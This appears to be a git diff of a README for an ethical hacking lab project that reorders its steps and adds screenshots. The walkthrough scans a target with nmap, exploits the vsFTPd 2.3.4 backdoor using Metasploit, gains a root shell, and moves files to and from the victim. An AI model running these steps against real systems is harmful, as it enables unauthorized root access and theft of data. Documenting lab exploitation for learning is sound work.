@@ -16,14 +16,17 @@ This ethical hacking project simulates a real-world exploitation scenario where 
 
 ## 🛰️ Scanning and Enumeration
 
-**General nmap scan (to feel around)**
+**1) General nmap scan (to feel around)**
 ```bash
 nmap <target-IP>
 ```
 
 ![Nmap Scan](images/nmap-scan.png)
 
-**Detailed nmap scan to see services and versions**
+**2) Detailed nmap scan to see services and versions**
+- Discovered open port: `21/tcp` (FTP)
+- Service detected: `vsFTPd 2.3.4` — a known vulnerable service with a backdoor.
+
 ```bash
 nmap -A -sV <target-IP>
 ```
@@ -32,20 +35,20 @@ nmap -A -sV <target-IP>
 ![Nmap Scan2](images/nmap-version-scan2.png)
 ![Nmap Scan2](images/nmap-version-scan3.png)
 
-- Discovered open port: `21/tcp` (FTP)
-- Service detected: `vsFTPd 2.3.4` — a known vulnerable service with a backdoor.
-
 ---
 
 ## 💣 Exploitation Process
 
-**Exploit Module Used:**
+**1) Exploit Module Used:**
 
 ```
 exploit/unix/ftp/vsftpd_234_backdoor
 ```
 
-**Metasploit Commands:**
+![Search Exploit](images/search-exploit.png)
+
+
+**2) Metasploit Commands:**
 
 ```bash
 use exploit/unix/ftp/vsftpd_234_backdoor
@@ -59,13 +62,24 @@ run
 [*] Command shell session 1 opened
 ```
 
+![Exploit](images/exploit.png)
+
 ---
 
 ## 🧪 Post-Exploitation
 
 - Verified root access with `whoami` → `root`
+
+![Exploit](images/verify-root-access.png)
+
 - Navigated file system, listed directories
+
+![Exploit](images/file-navigation.png)
+
 - Transferred files from attacker to victim using Meterpreter `upload` command
+
+![Exploit](images/upload1.png)
+
 - Downloaded victim's files back to Kali using `download` command
 
 ---
